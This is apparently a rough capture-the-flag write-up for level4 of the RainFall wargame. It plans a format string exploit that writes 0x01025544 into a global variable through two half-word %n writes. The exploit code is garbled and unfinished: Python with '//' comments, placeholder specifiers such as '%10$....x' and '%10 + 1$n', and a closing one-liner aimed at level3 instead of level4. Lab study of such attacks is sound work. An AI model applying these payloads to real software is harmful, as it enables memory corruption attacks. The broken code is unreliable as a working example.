We see that we have a format string exploit that is vulnerable

However, the value to write to m, the global variable, is `16930116`. This is way bigger than the size of our buffer

Also, printf is called in a function p, which is another scope than where your buffer is located

First let's get the address of m

```console
level4@RainFall:~$ readelf -s level4 | grep m
66: 08049810     4 OBJECT  GLOBAL DEFAULT   25 m
```

## How to write `16930116` at `0x08049810` ??

Address of m:		`0x08049810`						= `\x10\x98\x04\x08`
Address of m + 2:	`0x08049810 + 2`	= `0x08049812`	= `\x12\x98\x04\x08`


### Lets do 2 writes!

`0x5544` = `21828` at `0x08049810` = `\x10\x98\x04\x08`
`0x0102` = `258` at `0x08049810 + 2` = `0x08049812`

value to write in m: `16930116` = `0x01025544`


$10
`%.$value.`: put nb of paddings (whitespace) equal to value

```python
exploit = ""
exploit += "\x10\x98\x04\x08"	//cible 1
exploit += "\x12\x98\x04\x08"	//cible 2
exploit += "%10$21828x"			//value of cible 1 - nb chars written so far
exploit += "%10$n"				//write cible 1 
exploit += "%10$....x"			//value of cible 2 - nb chars written so far
exploit += "%10 + 1$n"				//write cible2
``` 

```bash
(python -c 'print ("\x10\x98\x04\x08" + "|" * 60 + "%4$n")'; cat) | ./level3
```
